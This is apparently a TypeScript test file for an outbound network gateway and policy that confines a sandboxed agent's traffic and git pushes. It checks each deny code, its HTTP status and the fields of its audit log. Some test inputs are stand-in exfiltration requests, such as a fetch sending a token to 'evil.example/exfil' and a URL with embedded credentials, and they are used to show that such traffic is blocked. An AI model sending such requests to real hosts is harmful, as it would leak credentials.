import { describe, expect, it } from "vitest";
import { RECEIVE_PACK_REJECT_CODES } from "../../src/git-pkt";
import {
  GATEWAY_DENY_CODES,
  type GitCredential,
  handleOutbound,
  type OutboundDeps,
} from "../../src/outbound-gateway";
import { decideOutbound, POLICY_DENY_CODES } from "../../src/outbound-policy";

// Phase 7 M3: outbound_denied の reason（違反コード）ごとに、dest の分類・応答・JSON の形を確かめる。
// 違反コードの一覧は src 側に定数で持ち（型で網羅を強制している）、ここの表が一覧と過不足なく一致することを確かめる。
// 一覧にコードを足したら、この表にも行を足す必要がある（足さないとこのテストが落ちる）。

const enc = new TextEncoder();
const A = "a".repeat(40);
const B = "b".repeat(40);
const NOW = 1_800_000_000_000;
const CRED: GitCredential = { token: "ghs_secret_token", expiresAt: NOW + 3_600_000 };
const REF = "refs/heads/agent/task-t1";
const GH = "https://github.com/acme/hello";
const FLUSH = enc.encode("0000");

function cat(...parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let o = 0;
  for (const p of parts) {
    out.set(p, o);
    o += p.length;
  }
  return out;
}
function pkt(s: string): Uint8Array {
  const b = enc.encode(s);
  return cat(enc.encode((b.length + 4).toString(16).padStart(4, "0")), b);
}
const cmd = (ref = REF, caps = "report-status") => cat(pkt(`${A} ${B} ${ref}\0${caps}`), FLUSH);
function streamOf(...chunks: Uint8Array[]): ReadableStream<Uint8Array> {
  return new ReadableStream({
    start(c) {
      for (const x of chunks) c.enqueue(x);
      c.close();
    },
  });
}

type Dest = "github" | "registry" | "other";
interface Case {
  /** handleOutbound に渡すリクエスト */
  request?: () => Request;
  deps?: Partial<OutboundDeps>;
  status: number;
  dest: Dest;
  /** Request を作れない・policy 単体でしか出ない（handleOutbound を通らない）コード */
  policyOnly?: { method: string; url: string; upgrade?: boolean };
}

const recvUrl = `${GH}.git/git-receive-pack`;
const recv = (body: ReadableStream<Uint8Array> | null, headers: HeadersInit = {}) =>
  new Request(recvUrl, {
    method: "POST",
    body,
    headers: { "content-type": "application/x-git-receive-pack-request", ...headers },
    // @ts-expect-error workerd の Request は ReadableStream の本文に duplex を要する場合がある
    duplex: "half",
  });
const recvHead = (head: Uint8Array) => () => recv(streamOf(head));

const POLICY_CASES: Record<string, Case> = {
  invalid_url: {
    policyOnly: { method: "GET", url: "not a url" },
    status: 403,
    dest: "other",
  },
  upgrade_not_allowed: {
    request: () => new Request("https://evil.example/", { headers: { upgrade: "websocket" } }),
    status: 403,
    dest: "other",
  },
  non_https: {
    request: () => new Request("http://registry.npmjs.org/tiny-pkg"),
    status: 403,
    dest: "registry",
  },
  port_not_allowed: {
    request: () => new Request("https://registry.npmjs.org:8443/tiny-pkg"),
    status: 403,
    dest: "registry",
  },
  url_credentials: {
    policyOnly: { method: "GET", url: "https://user:pw@evil.example/" },
    status: 403,
    dest: "other",
  },
  registry_method: {
    request: () => new Request("https://pypi.org/simple/x", { method: "POST", body: "x" }),
    status: 403,
    dest: "registry",
  },
  host_not_allowed: {
    request: () => new Request("https://evil.example/exfil?token=ghs_x"),
    status: 403,
    dest: "other",
  },
  github_path: {
    request: () => new Request(`${GH}.git/info/lfs/objects/batch`),
    status: 403,
    dest: "github",
  },
  github_no_repo: {
    request: () => new Request(`${GH}.git/info/refs?service=git-upload-pack`),
    deps: { props: { taskId: "t1" } },
    status: 403,
    dest: "github",
  },
  github_other_repo: {
    request: () =>
      new Request("https://github.com/acme/other.git/info/refs?service=git-upload-pack"),
    status: 403,
    dest: "github",
  },
  github_push_not_allowed: {
    request: () => new Request(`${GH}.git/info/refs?service=git-receive-pack`),
    // taskId が ref に使えない形なら、push は何も許可しない
    deps: { props: { repo: { owner: "acme", name: "hello" }, taskId: "bad id" } },
    status: 403,
    dest: "github",
  },
  github_service: {
    request: () => new Request(`${GH}.git/info/refs?service=git-foo`),
    status: 403,
    dest: "github",
  },
  github_method: {
    request: () => new Request(`${GH}.git/git-upload-pack`),
    status: 403,
    dest: "github",
  },
};

const hanging = () =>
  new ReadableStream<Uint8Array>({
    start(c) {
      c.enqueue(cmd().subarray(0, 8));
    },
    pull: () => new Promise(() => {}),
  });
const erroring = () =>
  new ReadableStream<Uint8Array>({
    start(c) {
      c.error(new Error("boom"));
    },
  });

const GATEWAY_CASES: Record<string, Case> = {
  body_too_large: {
    request: () => recv(streamOf(cmd()), { "content-length": "101" }),
    deps: { limits: { receivePackMaxBytes: 100 } },
    status: 413,
    dest: "github",
  },
  content_encoding: {
    request: () => recv(streamOf(cmd()), { "content-encoding": "gzip" }),
    status: 403,
    dest: "github",
  },
  content_type: {
    request: () => recv(streamOf(cmd()), { "content-type": "application/octet-stream" }),
    status: 403,
    dest: "github",
  },
  credential_unavailable: {
    request: () => new Request(`${GH}.git/info/refs?service=git-upload-pack`),
    deps: { readCredential: async () => undefined },
    status: 401,
    dest: "github",
  },
  no_body: { request: () => recv(null), status: 403, dest: "github" },
  head_timeout: {
    request: () => recv(hanging()),
    deps: { limits: { headTimeoutMs: 30 } },
    status: 408,
    dest: "github",
  },
  truncated_head: {
    request: () => recv(streamOf(cmd().subarray(0, 12))),
    status: 403,
    dest: "github",
  },
  ref_not_allowed: {
    request: () => recv(streamOf(cmd("refs/heads/main"))),
    status: 403,
    dest: "github",
  },
  push_not_permitted: {
    // コマンドは作業ブランチ向きで正しいが、SandboxDO に push の許可証が無い（子の bash の直接の git push）
    request: () => recv(streamOf(cmd())),
    deps: { readPushPermit: async () => undefined },
    status: 403,
    dest: "github",
  },
  read_error: { request: () => recv(erroring()), status: 403, dest: "github" },
};

const PKT_CASES: Record<string, Case> = {
  bad_pkt_len: { request: recvHead(enc.encode("zzzz")), status: 403, dest: "github" },
  shallow: { request: recvHead(cat(pkt(`shallow ${A}`), cmd())), status: 403, dest: "github" },
  push_cert: { request: recvHead(cat(pkt("push-cert\0x"), FLUSH)), status: 403, dest: "github" },
  bad_command: {
    request: recvHead(cat(pkt(`${"a".repeat(39)} ${B} ${REF}\0x`), FLUSH)),
    status: 403,
    dest: "github",
  },
  delete: {
    request: recvHead(cat(pkt(`${A} ${"0".repeat(40)} ${REF}\0x`), FLUSH)),
    status: 403,
    dest: "github",
  },
  bad_ref: { request: recvHead(cmd("refs/tags/v1")), status: 403, dest: "github" },
  push_options: {
    request: recvHead(cmd(REF, "report-status push-options")),
    status: 403,
    dest: "github",
  },
  object_format: {
    request: recvHead(cmd(REF, "object-format=sha256")),
    status: 403,
    dest: "github",
  },
  head_too_large: {
    // flush が来ないまま、2 つ目の pkt が未完（長さは 0xfff0 と宣言）のまま、読んだ量が上限（64KiB）を超える
    request: recvHead(
      cat(
        pkt(`${A} ${B} ${REF}\0${"x".repeat(5_000)}`),
        enc.encode("fff0"),
        enc.encode("y".repeat(61_000)),
      ),
    ),
    status: 403,
    dest: "github",
  },
  no_command: { request: recvHead(FLUSH), status: 403, dest: "github" },
  multiple_commands: {
    request: recvHead(cat(pkt(`${A} ${B} ${REF}\0x`), pkt(`${A} ${B} refs/heads/main`), FLUSH)),
    status: 403,
    dest: "github",
  },
};

const ALL: Record<string, Case> = { ...POLICY_CASES, ...GATEWAY_CASES, ...PKT_CASES };

function setup(over: Partial<OutboundDeps> = {}) {
  const upstream: string[] = [];
  const seen: { event: string; fields: Record<string, unknown> }[] = [];
  const deps: OutboundDeps = {
    props: { repo: { owner: "acme", name: "hello" }, task: "agent/task-t1", taskId: "t1" },
    readCredential: async () => CRED,
    readPushPermit: async () => ({ ref: REF, newSha: B }),
    fetchUpstream: async (url) => {
      upstream.push(url);
      return new Response("upstream-ok");
    },
    now: () => NOW,
    audit: (event, fields) => void seen.push({ event, fields: { ...fields } }),
    ...over,
  };
  return { deps, upstream, seen };
}

describe("違反コードの一覧と表の対応（一覧を増やしたらテストの追加を促す）", () => {
  it("一覧（policy + gateway + receive-pack の解析）の全コードが表にあり、表に余分な行も無い", () => {
    const listed = [...POLICY_DENY_CODES, ...GATEWAY_DENY_CODES, ...RECEIVE_PACK_REJECT_CODES];
    expect(new Set(listed).size, "一覧の中でコードが重複している").toBe(listed.length);
    expect(Object.keys(ALL).sort()).toEqual([...listed].sort());
  });

  it("表のグループは対応する一覧と一致する", () => {
    expect(Object.keys(POLICY_CASES).sort()).toEqual([...POLICY_DENY_CODES].sort());
    expect(Object.keys(PKT_CASES).sort()).toEqual([...RECEIVE_PACK_REJECT_CODES].sort());
  });
});

describe("outbound_denied: コードごとの応答・dest・監査の形", () => {
  for (const [code, c] of Object.entries(ALL)) {
    if (c.policyOnly) {
      it(`${code}: handleOutbound を通らない（Request を作れない）ので、policy が code を返す`, () => {
        const d = decideOutbound(c.policyOnly as { method: string; url: string });
        expect(d.allow).toBe(false);
        expect(d.allow === false && d.code).toBe(code);
      });
      continue;
    }
    it(`${code}: status ${c.status}、dest ${c.dest}。監査は taskId・caller・reason・dest だけ。上流に出ない`, async () => {
      const { deps, upstream, seen } = setup(c.deps);
      const res = await handleOutbound((c.request as () => Request)(), deps);
      expect(res.status).toBe(c.status);
      expect(upstream).toEqual([]);
      expect(seen).toEqual([
        {
          event: "outbound_denied",
          fields: {
            taskId: c.deps?.props?.taskId ?? "t1",
            caller: "child",
            reason: code,
            dest: c.dest,
          },
        },
      ]);
      // 応答にも、path・query・トークンは出ない
      const body = await res.text();
      expect(body).not.toMatch(/ghs_|exfil|token=/);
    });
  }

  it("console に出す形（deps.audit なし）は 1 行の JSON で、許可したフィールドだけ", async () => {
    const lines: string[] = [];
    const orig = console.log;
    console.log = (...a: unknown[]) => void lines.push(a.map(String).join(" "));
    try {
      const { deps } = setup({ audit: undefined });
      await handleOutbound(new Request("https://evil.example/p?token=ghs_x"), deps);
    } finally {
      console.log = orig;
    }
    expect(lines).toHaveLength(1);
    expect(JSON.parse(lines[0] as string)).toEqual({
      audit: true,
      event: "outbound_denied",
      ts: expect.any(Number),
      taskId: "t1",
      caller: "child",
      reason: "host_not_allowed",
      dest: "other",
    });
  });
});
